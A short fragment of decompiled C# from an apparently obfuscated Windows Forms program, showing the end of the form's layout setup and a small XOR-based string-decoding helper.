		((Form)this).add_Load((EventHandler)GForm0_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private static string smethod_7(string string_0)
	{
		int length = string_0.Length;
		char[] array = new char[length];
		for (int i = 0; i < array.Length; i++)
		{
			char c = string_0[i];
			byte b = (byte)(c ^ (length - i));
			byte b2 = (byte)(((int)c >> 8) ^ i);
			array[i] = (char)((b2 << 8) | b);
		}
		return string.Intern(new string(array));
	}
}
